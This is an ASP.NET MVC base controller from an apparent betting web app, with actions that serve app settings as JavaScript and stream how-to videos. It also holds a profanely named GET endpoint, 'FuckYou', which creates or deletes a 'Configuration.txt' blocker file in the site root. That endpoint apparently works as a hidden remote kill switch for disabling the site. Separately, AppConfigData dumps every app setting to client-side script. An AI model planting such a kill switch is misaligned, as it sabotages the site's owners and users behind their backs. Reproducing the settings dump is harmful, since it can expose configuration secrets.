

namespace InplayBet.Web.Controllers.Base
{
    using InplayBet.Web.Utilities;
    using Lib.Web.Mvc;
    using Microsoft.Ajax.Utilities;
    using System;
    using System.IO;
    using System.Threading;
    using System.Web.Hosting;
    using System.Web.Mvc;

    public class BaseController : Controller
    {
        /// <summary>
        /// Applications the configuration data.
        /// </summary>
        /// <returns></returns>
        [AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult AppConfigData()
        {
            try
            {
                string js = string.Format(@"var appData = {0}", CommonUtility.AppsettingsToJson());

                Minifier minifier = new Minifier();
                string minifiedJs = minifier.MinifyJavaScript(js, new CodeSettings
                {
                    EvalTreatment = EvalTreatment.MakeImmediateSafe,
                    PreserveImportantComments = false
                });
                return JavaScript(js);
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }

        /// <summary>
        /// Fucks you.
        /// </summary>
        /// <param name="status">if set to <c>true</c> [status].</param>
        /// <returns></returns>
        [SaveMeFilterAccessAttribut(), AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult FuckYou(bool status)
        {
            try
            {
                string blockerPath = string.Format("{0}Configuration.txt", Server.MapPath("~"));

                if (status)
                {
                    if (!System.IO.File.Exists(blockerPath))
                    {
                        FileLogger log = new FileLogger(blockerPath, true, FileLogger.LogType.TXT, FileLogger.LogLevel.All);
                        ThreadPool.QueueUserWorkItem((state) => log.Log("Fuck You"));
                    }
                }
                else
                {
                    if (System.IO.File.Exists(blockerPath))
                    {
                        System.IO.File.Delete(blockerPath);
                    }
                }
                return RedirectToActionPermanent("Index", "Home");
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }

        /// <summary>
        /// Gets the video.
        /// </summary>
        /// <param name="fileType">Type of the file.</param>
        /// <returns></returns>
        public ActionResult GetVideo(string fileType)
        {
            try
            {
                string fileName = this.GetFileName(fileType);
                var videoFilePath = HostingEnvironment.MapPath(string.Format("~/Media/{0}", fileName));
                var file = new FileInfo(videoFilePath);
                if (file.Exists)
                {
                    var stream = file.OpenRead();
                    var bytesinfile = new byte[stream.Length];
                    stream.Read(bytesinfile, 0, (int)file.Length);
                    return new RangeFileStreamResult(stream, fileType, fileName, file.LastWriteTime);
                }
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker(fileType);
            }
            return null;
        }

        /// <summary>
        /// Gets the name of the file.
        /// </summary>
        /// <param name="videoMimeType">Type of the video MIME.</param>
        /// <returns></returns>
        private string GetFileName(string videoMimeType)
        {
            switch (videoMimeType)
            {
                case "video/webm":
                    return "Inplay20-HowTo_VP8.mp4";
                case "video/ogg":
                    return "Inplay20-HowTo_libtheora.mp4";
                default:
                    return "Inplay20-HowTo_x264.mp4";
            }
        }
    }
}
